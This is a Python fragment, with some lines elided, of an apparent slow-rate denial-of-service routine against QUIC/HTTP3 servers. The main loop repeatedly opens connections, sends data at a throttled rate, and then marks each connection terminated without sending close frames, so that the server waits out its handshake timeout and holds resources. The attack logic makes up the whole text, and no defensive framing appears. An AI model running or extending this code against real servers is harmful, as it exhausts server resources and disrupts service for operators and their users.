...
async def main(addr, alpn=H3_ALPN[0], debug=False, *args, **kwargs):
    while True:
        async with connect(
            ...
            c.transmit()
            await asyncio.sleep(calculate_slowrate_wait_time(c._quic, time=1))

            # Do not close connection, 
            # Mark connection as closed to not send close frames
            # and have the server wait for the handshake timeout
            c._quic._state = QuicConnectionState.TERMINATED
            c._closed.set()
